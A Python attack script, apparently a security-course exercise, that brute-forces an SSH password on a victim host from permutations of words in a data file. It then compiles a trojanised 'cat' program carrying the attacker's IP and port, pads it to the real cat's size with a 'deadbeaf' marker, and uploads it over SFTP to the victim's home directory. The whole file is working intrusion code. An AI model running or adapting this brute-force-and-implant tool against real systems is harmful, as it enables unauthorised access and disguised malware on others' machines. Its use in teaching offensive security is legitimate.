import itertools
import paramiko
import time
import sys
import os
# https://stackoverflow.com/questions/25609153/paramiko-error-reading-ssh-protocol-banner
# above bug I don't know how to solve
def crack_password(victim_ip):
    
    # try all combimation of entries
    entries = [line.rstrip() for line in open('victim.dat', 'r')]
    print(entries)
    import pdb
    # pdb.set_trace()
    for i in range(1,len(entries)+1,1):
        print(i)
        combinations = itertools.combinations(entries, i)
        combinations = list(combinations)

        # iterate all 
        for j in range(len(combinations)):
            for l in itertools.permutations(combinations[j], i):
                permute = list(l)
                try_password = ""
                for k in range(i):
                    try_password = try_password + permute[k]
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    # can Adjust parameter auth_timeout to achieve it
                    client.connect(victim_ip, username='csc2021', password=try_password, banner_timeout=500)
                except paramiko.ssh_exception.AuthenticationException:
                    print("bad password ", try_password, "length ", len(try_password))
                    client.close()
                    continue
                print("pass ",try_password)
                return client, try_password
    
    print("crack password fail")
    exit()
            
def parse_arg():
    return sys.argv[1], sys.argv[2], sys.argv[3]

def construct_cat(attacker_ip, attacker_port):
    fptr = open("address_port.txt", "w")
    fptr.write(" -a " + attacker_ip + " -p " + attacker_port)
    fptr.close()

    os.system("xxd -i address_port.txt > address_port.h")
    os.system("gcc task2.c -o cat")
    pass

def getSize(fileobject):
    fileobject.seek(0,2) # move the cursor to the end of the file
    size = fileobject.tell()
    return size

def modify():
    cat_size = 43416
    infect = open('cat', 'rb')
    infect_size = getSize(infect)
    infect.close()

    infect = open('cat', 'a')
    concat = ''
    enlarge_size = cat_size - infect_size - 8
    for i in range(enlarge_size):
        concat += 'a'
    concat += 'deadbeaf'
    infect.write(concat)
    infect.close()

if __name__ == '__main__':
    victim_ip, attacker_ip, attacker_port = parse_arg() 

    client, password = crack_password(victim_ip)
    construct_cat(attacker_ip, attacker_port)
    modify()
    # how to enter password in scp 
    sftp = client.open_sftp()
    sftp.put("./cat", "/home/csc2021/cat")
    # temp.close()

    client.close()
    pass